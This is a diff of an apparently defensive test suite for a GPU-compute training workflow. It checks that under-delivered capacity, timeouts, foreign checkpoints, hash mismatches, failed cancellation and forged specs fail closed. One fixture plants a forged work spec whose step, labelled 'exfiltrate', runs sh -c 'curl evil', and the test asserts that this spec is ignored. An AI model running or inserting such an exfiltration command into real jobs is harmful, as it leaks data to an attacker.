@@ -1,14 +1,9 @@
 /**
- * Governed Compute Realization — adversarial certification (Sprint 11).
+ * Governed Compute Realization — adversarial production certification.
  *
- * The named adversarial cases not already pinned by the per-sprint suites:
- * provider timeout mid-run, allocation evidence mismatch (reported GPU
- * under-delivery), wrong-run checkpoint resume, artifact hash mismatch
- * against the expected identity, cancel failure, and the promotion
- * boundary: compute completion can NEVER promote a candidate — only an
- * evaluation win can, and `promoted` is derived, not writable.
- *
- * Run with: node --test scripts/unit-compute-adversarial.test.mjs
+ * This suite attacks capacity honesty, observation uncertainty, checkpoint
+ * lineage, artifact identity, cancellation/release, caller-authored authority,
+ * key rotation, dataset-manifest laundering, and promotion boundaries.
  */
 
 import { test } from "node:test";
@@ -20,8 +15,16 @@ const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), ".."
 const kitApp = path.join(repoRoot, "cli/assets/worker-kits/growthub-custom-workspace-starter-v1/apps/workspace");
 const lib = (rel) => pathToFileURL(path.join(kitApp, "lib", rel)).href;
 
-const { executeProviderComputeRun, cancelProviderComputeRun, maybeExecuteProviderComputeForSandboxRun } = await import(lib("compute-execution.js"));
-const { COMPUTE_AUTHORITY_KEY_ENV, compileComputeAuthority, verifyComputeAuthorityAgainstWorkspace } = await import(lib("compute-authority.js"));
+const {
+  executeProviderComputeRun,
+  cancelProviderComputeRun,
+  maybeExecuteProviderComputeForSandboxRun,
+} = await import(lib("compute-execution.js"));
+const {
+  COMPUTE_AUTHORITY_KEY_ENV,
+  compileComputeAuthority,
+  verifyComputeAuthorityAgainstWorkspace,
+} = await import(lib("compute-authority.js"));
 const { hashComputeValue } = await import(lib("compute-work-spec.js"));
 const { deriveComputeLifecycle, deriveComputeArtifactHonesty } = await import(lib("compute-evidence.js"));
 const { deriveBenchmarkWins } = await import(lib("distillation-eval-harness.js"));
@@ -29,6 +32,7 @@ const { deriveFlywheelState } = await import(lib("distillation-fleet.js"));
 const { deriveComputeCustomerState } = await import(lib("compute-customer-state.js"));
 
 const RUN_ID = "trainrun_adv";
+const AUTH_ENV = { [COMPUTE_AUTHORITY_KEY_ENV]: "adversarial-suite-key" };
 
 function providerRow() {
   return {
@@ -48,35 +52,103 @@ function providerRow() {
   };
 }
 
-const CONFIG = { dataModel: { objects: [{ id: "api-registry", objectType: "api-registry", rows: [providerRow()] }] } };
+const CONFIG = {
+  dataModel: {
+    objects: [{ id: "api-registry", objectType: "api-registry", rows: [providerRow()] }],
+  },
+};
 
 function adapterWith(overrides = {}) {
+  const calls = { allocate: 0, execute: 0, status: 0, cancel: 0, release: 0 };
   return {
     id: "adv-adapter",
     label: "adv",
     description: "",
     locality: "remote",
+    calls,
     describeCapabilities() {
-      return { providerId: "adv-remote", adapterId: "adv-adapter", capacityProfiles: ["single-gpu-finetune", "multi-gpu-finetune"], availabilityModes: ["on-demand"], acceleratorClasses: ["any-gpu", "datacenter-gpu", "high-memory-gpu"], maxVramPerGpuGB: 141, maxGpusPerWorker: 8, maxWorkers: 4, supportsCheckpointing: true, supportsResume: true, supportsGangScheduling: true, regions: [], requiredEnv: [] };
+      return {
+        providerId: "adv-remote",
+        adapterId: "adv-adapter",
+        capacityProfiles: ["single-gpu-finetune", "multi-gpu-finetune"],
+        availabilityModes: ["on-demand"],
+        acceleratorClasses: ["any-gpu", "datacenter-gpu", "high-memory-gpu"],
+        maxVramPerGpuGB: 141,
+        maxGpusPerWorker: 8,
+        maxWorkers: 4,
+        supportsCheckpointing: true,
+        supportsResume: true,
+        supportsGangScheduling: true,
+        regions: [],
+        requiredEnv: [],
+      };
     },
     async inspectCapacity(ctx) {
-      return { providerId: "adv-remote", capacityProfileId: ctx.capacityProfileId, available: true, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, estimatedTotalUsd: 2, queueLatencySeconds: 0, quoteObservedAt: "2026-07-20T12:00:00.000Z", quoteExpiresAt: "2026-07-20T13:00:00.000Z", quoteRef: "" };
+      return {
+        providerId: "adv-remote",
+        capacityProfileId: ctx.capacityProfileId,
+        available: true,
+        availabilityMode: "on-demand",
+        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
+        estimatedTotalUsd: 2,
+        queueLatencySeconds: 0,
+        quoteObservedAt: "2026-07-20T12:00:00.000Z",
+        quoteExpiresAt: "2026-07-20T13:00:00.000Z",
+        quoteRef: "",
+      };
     },
     async allocate(ctx) {
-      return { allocationId: "alloc-adv", runRef: { ...ctx.runRef, providerResourceId: "res-adv" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: { gpuType: "A100", gpuCount: 4, workers: 1, region: "" } };
+      calls.allocate += 1;
+      return {
+        allocationId: "alloc-adv",
+        runRef: { ...ctx.runRef, providerResourceId: "res-adv" },
+        status: "allocated",
+        idempotencyKeyHash: ctx.idempotencyKeyHash,
+        availabilityMode: "on-demand",
+        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
+        requestedAt: "t",
+        allocatedAt: "t",
+        releasedAt: "",
+        releaseConfirmed: false,
+        allocated: { gpuType: "A100", gpuCount: 4, workers: 1, region: "" },
+      };
     },
-    async status() { return []; },
-    async collectArtifact() { return null; },
-    async cancel(ctx) { return [{ type: "compute-cancelled", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "cx", detail: "" }]; },
-    async release(ctx) { return [{ type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "rx", detail: "" }]; },
+    async execute(ctx) {
+      calls.execute += 1;
+      return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "queued", detail: "" }];
+    },
+    async status(ctx) {
+      calls.status += 1;
+      if (calls.status === 1) return [{ type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "running", detail: "" }];
+      return [{ type: "compute-completed", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "completed", detail: "" }];
+    },
+    async collectArtifact(ctx) {
+      return {
+        runRef: { ...ctx.runRef },
+        kind: "gguf",
+        locator: "volume://artifact/model.gguf",
+        sha256: "d".repeat(64),
+        sizeBytes: 100,
+        evidenceObservedAt: "t",
+      };
+    },
+    async cancel(ctx) {
+      calls.cancel += 1;
+      return [{ type: "compute-cancelled", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "cancelled", detail: "" }];
+    },
+    async release(ctx) {
+      calls.release += 1;
+      return [{ type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "released", detail: "" }];
+    },
     ...overrides,
   };
 }
 
 function ioWith(adapter) {
   let clock = Date.parse("2026-07-20T12:00:00.000Z");
+  const persisted = [];
   return {
-    getAdapter: (id) => (id === "adv-adapter" ? adapter : null),
+    getAdapter: (id) => id === "adv-adapter" ? adapter : null,
     listAdapterIds: () => ["adv-adapter"],
     envPresent: () => true,
     resolveEnv: () => "",
@@ -85,15 +157,28 @@ function ioWith(adapter) {
     sleep: async () => {},
     maxPolls: 3,
     pollIntervalMs: 0,
+    persistCompute: async (block) => { persisted.push(JSON.parse(JSON.stringify(block))); },
+    verifyArtifact: async (artifact) => ({ verifiedSha256: artifact.sha256, verificationKind: "test-materialized", sizeBytes: artifact.sizeBytes }),
+    persisted,
   };
 }
 
-const REQ8 = { workloadKind: "fine-tune", acceleratorClass: "datacenter-gpu", gpuCount: 8, minVramPerGpuGB: 80, minCpuCores: 8, minRamGB: 64, minDiskGB: 200, checkpointRequired: true, distributed: null, locality: { regions: [], dataResidency: "" }, estimatedDurationMinutes: 60 };
+const REQ8 = {
+  workloadKind: "fine-tune",
+  acceleratorClass: "datacenter-gpu",
+  gpuCount: 8,
+  minVramPerGpuGB: 80,
+  minCpuCores: 8,
+  minRamGB: 64,
+  minDiskGB: 200,
+  checkpointRequired: true,
+  distributed: null,
+  locality: { regions: [], dataResidency: "" },
+  estimatedDurationMinutes: 60,
+};
 
-// ---------------------------------------------------------------------------
-
-test("ADVERSARIAL — reported GPU mismatch: an 8-GPU ask answered with 4 GPUs fails closed and releases", async () => {
-  const adapter = adapterWith(); // allocates 4 GPUs
+test("ADVERSARIAL — under-delivered GPU allocation fails closed and releases", async () => {
+  const adapter = adapterWith(); // reports 4 GPUs for an 8-GPU ask
   const outcome = await executeProviderComputeRun({
     workspaceConfig: CONFIG,
     trainingRunId: RUN_ID,
@@ -104,15 +189,31 @@ test("ADVERSARIAL — reported GPU mismatch: an 8-GPU ask answered with 4 GPUs f
   assert.equal(outcome.result.ok, false);
   assert.match(outcome.result.error, /allocation evidence mismatch/);
   assert.match(outcome.result.error, /asked for 8 GPU/);
-  const types = outcome.computeBlock.events.map((e) => e.type);
+  const types = outcome.computeBlock.events.map((event) => event.type);
   assert.ok(types.includes("compute-failed"));
-  assert.ok(types.includes("compute-released"), "mismatched capacity is released, not silently trained on");
+  assert.ok(types.includes("compute-released"));
+  assert.equal(adapter.calls.execute, 0, "workload never executes on insufficient capacity");
 });
 
-test("ADVERSARIAL — provider timeout mid-run: unobservable status becomes an honest failure with release", async () => {
+test("ADVERSARIAL — provider timeout remains pending and does not release a possibly-running job", async () => {
   const adapter = adapterWith({
-    async allocate(ctx) { return { allocationId: "alloc-t", runRef: { ...ctx.runRef, providerResourceId: "res-t" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: null }; },
-    async status() { throw new Error("ETIMEDOUT: provider API unreachable"); },
+    async allocate(ctx) {
+      adapter.calls.allocate += 1;
+      return {
+        allocationId: "alloc-timeout",
+        runRef: { ...ctx.runRef, providerResourceId: "res-timeout" },
+        status: "allocated",
+        idempotencyKeyHash: ctx.idempotencyKeyHash,
+        availabilityMode: "on-demand",
+        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
+        requestedAt: "t",
+        allocatedAt: "t",
+        releasedAt: "",
+        releaseConfirmed: false,
+        allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" },
+      };
+    },
+    async status() { adapter.calls.status += 1; throw new Error("ETIMEDOUT: provider API unreachable"); },
   });
   const outcome = await executeProviderComputeRun({
     workspaceConfig: CONFIG,
@@ -121,67 +222,82 @@ test("ADVERSARIAL — provider timeout mid-run: unobservable status becomes an h
     requirements: { ...REQ8, gpuCount: 1 },
     io: ioWith(adapter),
   });
-  assert.equal(outcome.result.ok, false);
-  const failedEvents = outcome.computeBlock.events.filter((e) => e.type === "compute-failed");
-  assert.ok(failedEvents.some((e) => /ETIMEDOUT|unobservable/.test(e.detail)), "the timeout is named, not swallowed");
-  assert.ok(outcome.computeBlock.events.some((e) => e.type === "compute-release-requested"), "release still attempted");
+  assert.equal(outcome.result.ok, true);
+  assert.equal(outcome.result.exitCode, null);
+  assert.equal(outcome.result.adapterMeta.compute.pending, true);
+  assert.equal(outcome.result.adapterMeta.compute.remoteStateUnverified, true);
+  assert.equal(adapter.calls.release, 0, "uncertain observation never fabricates termination");
+  assert.equal(outcome.computeBlock.events.some((event) => event.type === "compute-failed"), false);
+  assert.ok(outcome.computeBlock.events.some((event) => /ETIMEDOUT|remote-state-unverified/.test(event.detail)));
 });
 
-test("ADVERSARIAL — wrong-run checkpoint: a checkpoint from another training run can never satisfy a resume", () => {
+test("ADVERSARIAL — a checkpoint from another run cannot satisfy resume", () => {
   const myRef = { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "p", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-1" };
   const events = [
-    { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { ...myRef, providerResourceId: "" }, providerEventId: "", detail: "" },
+    { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { ...myRef, providerResourceId: "" }, providerEventId: "rq", detail: "" },
     { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e1", detail: "" },
     { type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e2", detail: "" },
     { type: "compute-resuming", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e3", detail: "" },
   ];
   const foreign = { checkpointId: "ck-other", runRef: { ...myRef, trainingRunId: "some_other_run" }, locator: "s3://ck/other", sha256: "a".repeat(64), step: 999 };
-  const lifecycle = deriveComputeLifecycle({ events, checkpoints: [foreign] });
-  assert.ok(lifecycle.refused.some((r) => /no proven checkpoint/.test(r.reason)), "the foreign checkpoint does not prove resumability here");
-  assert.equal(lifecycle.provenCheckpoints.length, 0);
-
+  const refused = deriveComputeLifecycle({ events, checkpoints: [foreign] });
+  assert.ok(refused.refused.some((entry) => /no proven checkpoint/.test(entry.reason)));
+  assert.equal(refused.provenCheckpoints.length, 0);
   const mine = { ...foreign, checkpointId: "ck-mine", runRef: myRef };
-  const ok = deriveComputeLifecycle({ events, checkpoints: [mine] });
-  assert.equal(ok.provenCheckpoints.length, 1);
-  assert.equal(ok.resumed, true);
+  const accepted = deriveComputeLifecycle({ events, checkpoints: [mine] });
+  assert.equal(accepted.provenCheckpoints.length, 1);
+  assert.equal(accepted.resumed, true);
 });
 
-test("ADVERSARIAL — artifact hash mismatch against the expected identity is non-promotable", () => {
+test("ADVERSARIAL — artifact hash mismatch is non-promotable", () => {
   const lifecycle = { terminal: "completed" };
   const artifact = { runRef: {}, kind: "gguf", locator: "s3://out/m.gguf", sha256: "b".repeat(64), verifiedSha256: "b".repeat(64), sizeBytes: 1, evidenceObservedAt: "t" };
   const mismatch = deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "c".repeat(64) });
   assert.equal(mismatch.promotable, false);
   assert.equal(mismatch.reasonCode, "artifact-hash-mismatch");
-  const match = deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "b".repeat(64) });
-  assert.equal(match.promotable, true);
+  assert.equal(deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "b".repeat(64) }).promotable, true);
 });
 
-test("ADVERSARIAL — cancel failure: the failed cancel is recorded and capacity risk stays visible", async () => {
+test("ADVERSARIAL — failed cancel and release keep capacity/cost risk visible", async () => {
   const adapter = adapterWith({
-    async cancel() { throw new Error("cancel endpoint 500"); },
-    async release() { throw new Error("terminate endpoint 500"); },
+    async cancel() { adapter.calls.cancel += 1; throw new Error("cancel endpoint 500"); },
+    async release() { adapter.calls.release += 1; throw new Error("terminate endpoint 500"); },
   });
   const prior = {
     capacityProfileId: "single-gpu-finetune",
     idempotencyKeyHash: "h",
-    allocation: { allocationId: "alloc-c", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" }, status: "running", idempotencyKeyHash: "h", availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: null },
+    allocation: {
+      allocationId: "alloc-c",
+      runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" },
+      status: "running",
+      idempotencyKeyHash: "h",
+      availabilityMode: "on-demand",
+      costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
+      requestedAt: "t",
+      allocatedAt: "t",
+      releasedAt: "",
+      releaseConfirmed: false,
+      allocated: null,
+    },
     events: [
-      { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "", detail: "" },
+      { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "rq", detail: "" },
       { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" }, providerEventId: "e1", detail: "" },
     ],
   };
-  const outcome = await cancelProviderComputeRun({ priorCompute: prior, provider: { providerId: "adv-remote", adapterId: "adv-adapter", config: {} }, io: ioWith(adapter) });
-  assert.equal(outcome.cancelled, false, "a failed cancel is not a cancellation");
+  const outcome = await cancelProviderComputeRun({
+    priorCompute: prior,
+    provider: { providerId: "adv-remote", adapterId: "adv-adapter", config: {} },
+    io: ioWith(adapter),
+  });
+  assert.equal(outcome.cancelled, false);
   assert.equal(outcome.capacityMayStillExist, true);
   assert.equal(outcome.costMayAccrue, true);
-  assert.match(outcome.reason, /capacity may still exist/i);
+  assert.match(outcome.reason, /capacity may still exist|did not return verifiable cancellation/i);
 });
 
 // ---------------------------------------------------------------------------
-// Server-owned authority at the route hook
+// Server-owned authority attacks
 // ---------------------------------------------------------------------------
-
-const AUTH_ENV = { [COMPUTE_AUTHORITY_KEY_ENV]: "adversarial-suite-key" };
 
 function authorityRequest(overrides = {}) {
   return {
@@ -193,7 +309,9 @@ function authorityRequest(overrides = {}) {
     trainingProfileId: "unsloth-qlora-quantize-pipeline",
     baseModel: "gemma3:4b",
     datasetExportId: "export-adv-1",
+    datasetPath: "data/export-adv-1.jsonl",
     outputModelTag: "tuned-adv-v1",
+    artifactPath: "artifacts/tuned-adv-v1",
     ...overrides,
   };
 }
@@ -212,7 +330,7 @@ function authorityConfig({ request = authorityRequest(), compute = null, reserve
             localModel: reservedTag,
             apiRegistryId: "",
             lastExportId: "export-adv-1",
-            lastExportSummary: JSON.stringify({ recordCount: 6, path: "", version: 1 }),
+            lastExportSummary: JSON.stringify({ recordCount: 6, path: "data/export-adv-1.jsonl", version: 1 }),
           }],
         },
         {
@@ -238,36 +356,62 @@ function authorityConfig({ request = authorityRequest(), compute = null, reserve
 function authorityIo(adapter, workspaceConfig, env = AUTH_ENV) {
   return {
     ...ioWith(adapter),
-    compileAuthority: ({ trainingRunId, request }) => compileComputeAuthority({ workspaceConfig, trainingRunId, request, now: "2026-07-20T12:00:00.000Z", env }),
+    compileAuthority: ({ trainingRunId, request, datasetManifest }) => compileComputeAuthority({ workspaceConfig, trainingRunId, request, datasetManifest, now: "2026-07-20T12:00:00.000Z", env }),
     verifyAuthority: (authority) => verifyComputeAuthorityAgainstWorkspace({ workspaceConfig, trainingRunId: RUN_ID, authority, env }),
-    verifyArtifact: async (artifact) => ({ verifiedSha256: artifact.sha256, verificationKind: "test-materialized" }),
   };
 }
 
-test("ADVERSARIAL — a browser-authored, self-consistent intent/work spec on the receipt row is ignored: the server-compiled spec governs", async () => {
-  // The attacker plants a self-consistent spec (correct self-hashes, wrong
-  // content: an attacker-controlled output tag) in the caller-reachable
-  // compute column. The route hook must compile its own authority and submit
-  // THAT work spec — the planted one must have zero effect.
-  const forgedIntentBody = { schema: "growthub-compute-intent-v1", adaptivePlan: { mode: "x", tier: "x", baseModel: "gemma3:4b" }, capacityProfileId: "single-gpu-finetune", requirements: {}, requirementsHash: hashComputeValue({}), policy: { mode: "cloud" }, training: {} };
+test("ADVERSARIAL — caller-authored self-consistent spec is ignored; server spec reaches every provider boundary", async () => {
+  const forgedIntentBody = {
+    schema: "growthub-compute-intent-v1",
+    adaptivePlan: { mode: "x", tier: "x", baseModel: "gemma3:4b" },
+    capacityProfileId: "single-gpu-finetune",
+    requirements: {},
+    requirementsHash: hashComputeValue({}),
+    policy: { mode: "cloud" },
+    training: {},
+  };
   const forgedIntent = { ...forgedIntentBody, intentHash: hashComputeValue(forgedIntentBody) };
-  const forgedSpecBody = { schema: "growthub-training-execution-spec-v1", intentHash: forgedIntent.intentHash, requirementsHash: forgedIntent.requirementsHash, capacityProfileId: "single-gpu-finetune", trainingRunId: RUN_ID, modelTrainingRowId: "workspace-local", training: { steps: [{ stageId: "exfiltrate", label: "attacker step", bin: "sh", args: ["-c", "curl evil"] }] }, dataset: { exportId: "export-adv-1", path: "", corpusSha256: "" }, output: { modelTag: "attacker-tag", artifactPath: "/tmp/attacker", expectedKinds: [] } };
+  const forgedSpecBody = {
+    schema: "growthub-training-execution-spec-v1",
+    intentHash: forgedIntent.intentHash,
+    requirementsHash: forgedIntent.requirementsHash,
+    capacityProfileId: "single-gpu-finetune",
+    trainingRunId: RUN_ID,
+    modelTrainingRowId: "workspace-local",
+    training: { steps: [{ stageId: "exfiltrate", label: "attacker step", bin: "sh", args: ["-c", "curl evil"] }] },
+    dataset: { exportId: "export-adv-1", path: "", corpusSha256: "" },
+    output: { modelTag: "attacker-tag", artifactPath: "/tmp/attacker", expectedKinds: [] },
+  };
   const forgedSpec = { ...forgedSpecBody, workSpecHash: hashComputeValue(forgedSpecBody) };
-
-  const seenWorkSpecHashes = [];
+  const seen = [];
   const adapter = adapterWith({
     async allocate(ctx) {
-      seenWorkSpecHashes.push(ctx.workSpecHash);
-      assert.equal(ctx.workSpec?.output?.modelTag, "tuned-adv-v1", "the SERVER-compiled output identity reaches the provider");
-      return { allocationId: "alloc-authority", runRef: { ...ctx.runRef, providerResourceId: "res-authority" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" } };
+      adapter.calls.allocate += 1;
+      seen.push(ctx.workSpecHash);
+      assert.equal(ctx.workSpec.output.modelTag, "tuned-adv-v1");
+      return {
+        allocationId: "alloc-authority",
+        runRef: { ...ctx.runRef, providerResourceId: "res-authority" },
+        status: "allocated",
+        idempotencyKeyHash: ctx.idempotencyKeyHash,
+        availabilityMode: "on-demand",
+        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
+        requestedAt: "t",
+        allocatedAt: "t",
+        releasedAt: "",
+        releaseConfirmed: false,
+        allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" },
+      };
     },
     async execute(ctx) {
-      seenWorkSpecHashes.push(ctx.workSpecHash);
+      adapter.calls.execute += 1;
+      seen.push(ctx.workSpecHash);
       return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "q1", detail: "" }];
     },
   });
   const workspaceConfig = authorityConfig({
-    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", intent: forgedIntent, workSpec: forgedSpec, policy: forgedIntent.policy },
+    compute: { schema: "growthub-compute-evidence-v1", intent: forgedIntent, workSpec: forgedSpec },
   });
   const outcome = await maybeExecuteProviderComputeForSandboxRun({
     workspaceConfig,
@@ -275,30 +419,22 @@ test("ADVERSARIAL — a browser-authored, self-consistent intent/work spec on th
     name: RUN_ID,
     io: authorityIo(adapter, workspaceConfig),
   });
-  assert.ok(outcome, "the run engages the provider lane");
-  const serverHash = outcome.computeBlock.authority?.workSpecHash;
-  assert.ok(serverHash, "server authority journaled");
+  const serverHash = outcome.computeBlock.authority.workSpecHash;
   assert.notEqual(serverHash, forgedSpec.workSpecHash);
-  for (const seen of seenWorkSpecHashes) assert.equal(seen, serverHash, "every provider boundary saw the server-compiled spec, never the planted one");
-  assert.ok(!JSON.stringify(outcome.computeBlock.workSpec).includes("attacker-tag"), "the planted spec never re-enters the journal");
+  for (const observed of seen) assert.equal(observed, serverHash);
+  assert.equal(JSON.stringify(outcome.computeBlock.workSpec).includes("attacker-tag"), false);
 });
 
-test("ADVERSARIAL — governed inputs changed after sealing fail closed BEFORE provider submission", async () => {
-  // Seal authority over the original request, journal it, then let the
-  // customer request drift (a different output tag). The hook must refuse
-  // before allocate/execute — no paid boundary is crossed on stale authority.
-  const originalConfig = authorityConfig({});
-  const sealed = compileComputeAuthority({ workspaceConfig: originalConfig, trainingRunId: RUN_ID, now: "t", env: AUTH_ENV });
+test("ADVERSARIAL — governed input drift after sealing fails before provider submission", async () => {
+  const originalConfig = authorityConfig();
+  const sealed = compileComputeAuthority({ workspaceConfig: originalConfig, trainingRunId: RUN_ID, env: AUTH_ENV });
   assert.equal(sealed.ok, true, sealed.reason);
-
   const driftedConfig = authorityConfig({
-    request: authorityRequest({ outputModelTag: "tuned-adv-v2" }),
+    request: authorityRequest({ outputModelTag: "tuned-adv-v2", artifactPath: "artifacts/tuned-adv-v2" }),
     reservedTag: "tuned-adv-v2",
-    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", authority: sealed.authority },
+    compute: { schema: "growthub-compute-evidence-v1", authority: sealed.authority },
   });
-  const adapter = adapterWith({
-    async allocate() { throw new Error("allocate must never be reached on stale authority"); },
-  });
+  const adapter = adapterWith({ async allocate() { throw new Error("allocate must never be reached"); } });
   const outcome = await maybeExecuteProviderComputeForSandboxRun({
     workspaceConfig: driftedConfig,
     objectId: "model-training-runner",
@@ -307,76 +443,62 @@ test("ADVERSARIAL — governed inputs changed after sealing fail closed BEFORE p
   });
   assert.equal(outcome.result.ok, false);
   assert.match(outcome.result.error, /changed after compute authority was sealed/);
-  assert.equal(outcome.result.adapterMeta.compute.authorityRefused, true);
+  assert.equal(adapter.calls.allocate, 0);
 });
 
-test("KEY ROTATION — unchanged governed inputs under a NEW key reseal explicitly and execute; changed inputs refuse", async () => {
+test("KEY ROTATION — identical content reseals, changed content refuses", async () => {
   const KEY_A = { [COMPUTE_AUTHORITY_KEY_ENV]: "rotation-key-a" };
   const KEY_B = { [COMPUTE_AUTHORITY_KEY_ENV]: "rotation-key-b" };
-  const baseConfig = authorityConfig({});
-  const sealedUnderA = compileComputeAuthority({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, now: "t", env: KEY_A });
-  assert.equal(sealedUnderA.ok, true, sealedUnderA.reason);
+  const baseConfig = authorityConfig();
+  const sealedUnderA = compileComputeAuthority({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, env: KEY_A });
+  assert.equal(sealedUnderA.ok, true);
 
-  // Rotation with IDENTICAL content: the old seal no longer verifies, but
-  // the content identity reproduces — an explicit reseal proceeds and the
-  // journal records the new keyId.
-  const unchangedConfig = authorityConfig({
-    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", authority: sealedUnderA.authority },
-  });
-  const adapter = adapterWith({
-    async execute(ctx) { return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "q-rotate", detail: "" }]; },
-    async allocate(ctx) {
-      return { allocationId: "alloc-rotate", runRef: { ...ctx.runRef, providerResourceId: "res-rotate" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" } };
-    },
-  });
+  const unchanged = authorityConfig({ compute: { schema: "growthub-compute-evidence-v1", authority: sealedUnderA.authority } });
+  const adapter = adapterWith();
   const resealed = await maybeExecuteProviderComputeForSandboxRun({
-    workspaceConfig: unchangedConfig,
+    workspaceConfig: unchanged,
     objectId: "model-training-runner",
     name: RUN_ID,
-    io: authorityIo(adapter, unchangedConfig, KEY_B),
+    io: authorityIo(adapter, unchanged, KEY_B),
   });
-  assert.ok(resealed, "the run proceeds under the rotated key");
-  assert.notEqual(resealed.result.error || "", `governed inputs changed`, "no drift refusal for identical content");
-  assert.equal(resealed.computeBlock.authority.authorityHash, sealedUnderA.authority.authorityHash, "content identity is unchanged");
-  assert.notEqual(resealed.computeBlock.authority.keyId, sealedUnderA.authority.keyId, "the reseal is visible through the new keyId");
+  assert.equal(resealed.computeBlock.authority.authorityHash, sealedUnderA.authority.authorityHash);
+  assert.notEqual(resealed.computeBlock.authority.keyId, sealedUnderA.authority.keyId);
 
-  // Rotation combined with CHANGED request: the old seal is unverifiable AND
-  // the content no longer reproduces — zero provider calls.
-  const changedConfig = authorityConfig({
-    request: authorityRequest({ outputModelTag: "tuned-adv-v2" }),
+  const changed = authorityConfig({
+    request: authorityRequest({ outputModelTag: "tuned-adv-v2", artifactPath: "artifacts/tuned-adv-v2" }),
     reservedTag: "tuned-adv-v2",
-    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", authority: sealedUnderA.authority },
+    compute: { schema: "growthub-compute-evidence-v1", authority: sealedUnderA.authority },
   });
-  const trapped = adapterWith({
-    async allocate() { throw new Error("allocate must never be reached on a rotated+changed authority"); },
-  });
+  const trapped = adapterWith({ async allocate() { throw new Error("allocate must never be reached"); } });
   const refused = await maybeExecuteProviderComputeForSandboxRun({
-    workspaceConfig: changedConfig,
+    workspaceConfig: changed,
     objectId: "model-training-runner",
     name: RUN_ID,
-    io: authorityIo(trapped, changedConfig, KEY_B),
+    io: authorityIo(trapped, changed, KEY_B),
   });
   assert.equal(refused.result.ok, false);
   assert.match(refused.result.error, /changed after compute authority was sealed/);
+  assert.equal(trapped.calls.allocate, 0);
 });
 
